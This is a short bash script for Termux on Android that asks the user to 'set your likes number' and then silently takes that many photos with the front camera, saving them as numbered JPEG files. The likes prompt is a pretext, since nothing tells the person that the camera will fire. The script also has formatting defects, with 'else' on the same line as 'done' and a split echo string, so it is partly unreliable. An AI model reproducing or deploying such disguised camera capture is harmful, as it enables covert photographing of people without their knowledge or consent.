#!/bin/bash
function main(){
        printf "set your likes number:"
        read int
        echo
        if (( $int > 0 ))
        then
                echo -e "\nI guess it >= 1,yes or no?"
                while (( $int > 0 ))
                do

                termux-camera-photo -c 1 ${int}.jpg
                let "int--"

                done                                                  else
                echo "-----------------------------------------------------"
                echo "!!!:please recheck your number,it must greater than 1"
                echo -e "-------------------------------------
----------------\n"
                control

        fi
}
function control(){
        main
}
control
